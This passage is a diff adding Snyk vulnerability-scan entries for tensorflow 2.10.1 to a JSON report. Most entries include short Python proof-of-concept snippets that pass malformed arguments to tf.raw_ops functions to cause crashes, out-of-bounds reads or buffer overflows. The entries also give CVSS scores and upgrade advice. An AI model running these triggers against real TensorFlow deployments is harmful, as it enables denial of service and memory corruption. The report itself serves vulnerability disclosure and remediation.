@@ -2583,6 +2583,510 @@
             "severity": "HIGH",
             "status": "ACTIVE",
             "title": "CVE-2022-36003 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Out-of-bounds Read in `GRUBlockCellGrad`.\n## PoC\n```\r\nfunc = tf.raw_ops.GRUBlockCellGrad\r\n\r\npara = {'x': [[21.1, 156.2], [83.3, 115.4]], 'h_prev': array([[136.5],\r\n      [136.6]]), 'w_ru': array([[26.7,  0.8],\r\n      [47.9, 26.1],\r\n      [26.2, 26.3]]), 'w_c': array([[ 0.4],\r\n      [31.5],\r\n      [ 0.6]]), 'b_ru': array([0.1, 0.2 ], dtype=float32), 'b_c': 0x41414141, 'r': array([[0.3],\r\n      [0.4]], dtype=float32), 'u': array([[5.7],\r\n      [5.8]]), 'c': array([[52.9],\r\n      [53.1]]), 'd_h': array([[172.2],\r\n      [188.3 ]])}\r\n```\n## Remediation\nUpgrade `tensorflow` to version 2.11.1, 2.12.0 or higher.\n## References\n- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/ff459137c2716a2a60f7d441b855fcb466d778cb)",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3372987",
+            "name": "SNYK-PYTHON-TENSORFLOW-3372987",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3372987",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3372987 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Denial of Service (DoS) due to a floating point exception in `TensorListSplit` with `XLA`.\n## PoC\n```\r\nimport tensorflow as tf\r\n\r\nfunc = tf.raw_ops.TensorListSplit\r\npara = {'tensor': [1], 'element_shape': -1, 'lengths': [0]}\r\n\r\n@tf.function(jit_compile=True)\r\ndef fuzz_jit():\r\n y = func(**para)\r\n return y\r\n\r\nprint(fuzz_jit())\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many mach",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373035",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373035",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373035",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373035 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Denial of Service (DoS). When the parameter `summarize` of `tf.raw_ops.Print` is zero, the new method `SummarizeArray<bool>` will reference to a nullptr, leading to a seg fault.\n## PoC\n```\r\nimport tensorflow as tf\r\n\r\ntf.raw_ops.Print(input =  tf.constant([1, 1, 1, 1],dtype=tf.int32),\r\n                            data =  [[False, False, False, False], [False], [False, False, False]],\r\n                            message =  'tmp/I',\r\n                            first_n = 100,\r\n                            summarize = 0)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne p",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373002",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373002",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373002",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373002 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Out-of-bounds Read if the parameter `indices` for `DynamicStitch` does not match the shape of the parameter `data`.\n## PoC\n```\r\nimport tensorflow as tf\r\nfunc = tf.raw_ops.DynamicStitch\r\npara={'indices': [[0xdeadbeef], [405], [519], [758], [1015]], 'data': [[110.27793884277344], [120.29475402832031], [157.2418212890625], [157.2626953125], [188.45382690429688]]}\r\ny = func(**para)\r\n```\n## Remediation\nUpgrade `tensorflow` to version 2.11.1, 2.12.0 or higher.\n## References\n- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/ee004b18b976eeb5a758020af8880236cd707d05)",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3372990",
+            "name": "SNYK-PYTHON-TENSORFLOW-3372990",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3372990",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3372990 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Out-of-Bounds due to mismatched integer type sizes in `ValueMap::Manager::GetValueOrCreatePlaceholder`, because there is a bug with the `tfg-translate` call to `InitMlir`.\n## Remediation\nUpgrade `tensorflow` to version 2.11.1, 2.12.0 or higher.\n## References\n- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/2eedc8f676d2c3b8be9492e547b2bc814c10b367)\n- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/760322a71ac9033e122ef1f4b1c62813021e5938)",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373011",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373011",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373011",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373011 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to NULL Pointer Dereference. The function `tf.raw_ops.LookupTableImportV2` cannot handle scalars in the `values` parameter and gives a null pointer exception.\n## PoC\n```\r\nimport tensorflow as tf\r\n\r\nv = tf.Variable(1)\r\n\r\n@tf.function(jit_compile=True)\r\ndef test():\r\n   func = tf.raw_ops.LookupTableImportV2\r\n   para={'table_handle': v.handle,'keys': [62.98910140991211, 94.36528015136719], 'values': -919}\r\n\r\n   y = func(**para)\r\n   return y\r\n\r\nprint(test())\r\n```\n## Remediation\nUpgrade `tensorflow` to version 2.11.1, 2.12.0 or higher.\n## References\n- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/980b22536abcbbe1b4a5642fc940af33d8c19b69)",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373032",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373032",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373032",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373032 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Denial of Service (DoS) due to a floating point exception if the stride and window size are not positive for `tf.raw_ops.AvgPoolGrad`.\n## PoC\n```\r\nimport tensorflow as tf\r\nimport numpy as np\r\n\r\n@tf.function(jit_compile=True)\r\ndef test():\r\n   y = tf.raw_ops.AvgPoolGrad(orig_input_shape=[1,0,0,0], grad=[[[[0.39117979]]]], ksize=[1,0,0,0], strides=[1,0,0,0], padding=\"SAME\", data_format=\"NCHW\")\r\n   return y\r\n\r\nprint(test())\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that at",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373008",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373008",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373008",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373008 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Double Free. The `nn_ops.fractional_avg_pool_v2` and `nn_ops.fractional_max_pool_v2` functions require the first and fourth elements of their parameter `pooling_ratio` to be equal to 1.0, as pooling on batch and channel dimensions is not supported.\n## PoC\n```\r\nimport tensorflow as tf\r\nimport os\r\nimport numpy as np\r\nfrom tensorflow.python.ops import nn_ops\r\ntry:\r\n  arg_0_tensor = tf.random.uniform([3, 30, 50, 3], dtype=tf.float64)\r\n  arg_0 = tf.identity(arg_0_tensor)\r\n  arg_1_0 = 2\r\n  arg_1_1 = 3\r\n  arg_1_2 = 1\r\n  arg_1_3 = 1\r\n  arg_1 = [arg_1_0,arg_1_1,arg_1_2,arg_1_3,]\r\n  arg_2 = True\r\n  arg_3 = True\r\n  seed = 341261001\r\n  out = nn_ops.fractional_avg_pool_v2(arg_0,arg_1,arg_2,arg_3,seed=seed,)\r\nexcept Exception as e:\r\n  print(\"Error:\"+str(e))\r\n```\n## Remediation\nUpgrade `tensorflow` to version 2.11.1, 2.12.0 or higher.\n## References\n- [GitHub Commit](https://gith",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3372999",
+            "name": "SNYK-PYTHON-TENSORFLOW-3372999",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 8.0,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 8.0,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3372999",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3372999 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Incorrect Comparison. Constructing a `tflite` model with a paramater `filter_input_channel` of less than 1 gives a float pointer exception.\n## Remediation\nUpgrade `tensorflow` to version 2.11.1, 2.12.0 or higher.\n## References\n- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/34f8368c535253f5c9cb3a303297743b62442aaa)",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373029",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373029",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373029",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373029 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to NULL Pointer Dereference when `SparseSparseMaximum` is given invalid sparse tensors as inputs.\n## PoC\n```\r\nimport tensorflow as tf\r\ntf.raw_ops.SparseSparseMaximum(\r\n a_indices=[[1]],\r\n a_values =[ 0.1 ],\r\n a_shape = [2],\r\n b_indices=[[]],\r\n b_values =[2 ],\r\n b_shape = [2],\r\n)\r\n```\n## Remediation\nUpgrade `tensorflow` to version 2.11.1, 2.12.0 or higher.\n## References\n- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/5e0ecfb42f5f65629fd7a4edd6c4afe7ff0feb04)",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3372984",
+            "name": "SNYK-PYTHON-TENSORFLOW-3372984",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3372984",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3372984 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Integer Overflow or Wraparound in `EditDistance`. A fix is included in TensorFlow version 2.12.0 and version 2.11.1.\n## PoC\n```\r\nimport tensorflow as tf\r\npara={\r\n    'hypothesis_indices': [[]],\r\n    'hypothesis_values': ['tmp/'],\r\n    'hypothesis_shape': [],\r\n    'truth_indices': [[]],\r\n    'truth_values': [''],\r\n    'truth_shape': [],\r\n    'normalize': False\r\n    }\r\ntf.raw_ops.EditDistance(**para)\r\n```\n## Remediation\nUpgrade `tensorflow` to version 2.11.1, 2.12.0 or higher.\n## References\n- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/08b8e18643d6dcde00890733b270ff8d9960c56c)",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373014",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373014",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.3,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.3,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373014",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373014 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Denial of Service (DoS) when running with XLA, `tf.raw_ops.ParallelConcat` segfaults with a nullptr dereference when given a parameter `shape` with rank that is not greater than zero.\n## PoC\n```\r\nimport tensorflow as tf\r\n\r\nfunc = tf.raw_ops.ParallelConcat\r\npara = {'shape':  0, 'values': [1]}\r\n\r\n@tf.function(jit_compile=True)\r\ndef test():\r\n   y = func(**para)\r\n   return y\r\n\r\ntest()\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the syst",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373041",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373041",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373041",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373041 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Buffer Overflow in `TAvgPoolGrad`.\n## PoC\n```\r\nimport os\r\nos.environ['TF_ENABLE_ONEDNN_OPTS'] = '0'\r\nimport tensorflow as tf\r\nprint(tf.__version__)\r\nwith tf.device(\"CPU\"):\r\n    ksize = [1, 40, 128, 1]\r\n    strides = [1, 128, 128, 30]\r\n    padding = \"SAME\"\r\n    data_format = \"NHWC\"\r\n    orig_input_shape = [11, 9, 78, 9]\r\n    grad = tf.saturate_cast(tf.random.uniform([16, 16, 16, 16], minval=-128, maxval=129, dtype=tf.int64), dtype=tf.float32)\r\n    res = tf.raw_ops.AvgPoolGrad(\r\n        ksize=ksize,\r\n        strides=strides,\r\n        padding=padding,\r\n        data_format=data_format,\r\n        orig_input_shape=orig_input_shape,\r\n        grad=grad,\r\n    )\r\n```\n## Remediation\nUpgrade `tensorflow` to version 2.11.1, 2.12.0 or higher.\n## References\n- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/ddaac2bdd099bec5d7923dea45276a7558217e5b)",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373023",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373023",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373023",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373023 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Denial of Service (DoS) due to a floating point exception in `AudioSpectrogram`.\n## PoC\n```\r\nimport tensorflow as tf\r\n\r\npara = {'input': tf.constant([[14.], [24.]], dtype=tf.float32), 'window_size': 1, 'stride': 0, 'magnitude_squared': False}\r\nfunc = tf.raw_ops.AudioSpectrogram\r\n\r\n@tf.function(jit_compile=True)\r\ndef fuzz_jit():\r\n   y = func(**para)\r\n   return y\r\n\r\nfuzz_jit()\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by ",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3372993",
+            "name": "SNYK-PYTHON-TENSORFLOW-3372993",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3372993",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3372993 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to NULL Pointer Dereference due to a null pointer error in `RandomShuffle` with `XLA` enabled.\n## PoC\n```\r\nimport tensorflow as tf\r\n\r\nfunc = tf.raw_ops.RandomShuffle\r\npara = {'value': 1e+20, 'seed': -4294967297, 'seed2': -2147483649}\r\n\r\n@tf.function(jit_compile=True)\r\ndef test():\r\n   y = func(**para)\r\n   return y\r\n\r\ntest()\r\n```\n## Remediation\nUpgrade `tensorflow` to version 2.11.1, 2.12.0 or higher.\n## References\n- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/728113a3be690facad6ce436660a0bc1858017fa)",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373038",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373038",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373038",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373038 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Heap-based Buffer Overflow. Attackers can access heap memory which is not in the control of user, leading to a crash or remote code execution. The fix will be included in TensorFlow version 2.12.0 and will also cherrypick this commit on TensorFlow version 2.11.1.\n## PoC\n```\r\nimport tensorflow as tf\r\n@tf.function\r\ndef test():\r\n    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],\r\n    \t\t\t\t\t\t\t\t   input_min=[1.0],\r\n    \t\t\t\t\t\t\t\t   input_max=[10.0],\r\n    \t\t\t\t\t\t\t\t   signed_input=True,\r\n    \t\t\t\t\t\t\t\t   num_bits=1,\r\n    \t\t\t\t\t\t\t\t   range_given=True,\r\n    \t\t\t\t\t\t\t\t   round_mode='HALF_TO_EVEN',\r\n    \t\t\t\t\t\t\t\t   narrow_range=True,\r\n    \t\t\t\t\t\t\t\t   axis=0x7fffffff)\r\ntest()\r\n```\n## Remediation\nUpgrade `tensorflow` to version 2.11.1, 2.12.0 or higher.\n## References\n- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb)",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373020",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373020",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373020",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373020 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to Denial of Service (DoS). When running with XLA, `tf.raw_ops.Bincount` segfaults when given a parameter `weights` that is neither the same shape as parameter `arr` nor a length-0 tensor.\n## PoC\n```\r\nimport tensorflow as tf\r\n\r\nfunc = tf.raw_ops.Bincount\r\npara={'arr': 6, 'size': 804, 'weights': [52, 351]}\r\n\r\n@tf.function(jit_compile=True)\r\ndef fuzz_jit():\r\n y = func(**para)\r\n return y\r\n\r\nprint(fuzz_jit())\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog net",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373026",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373026",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
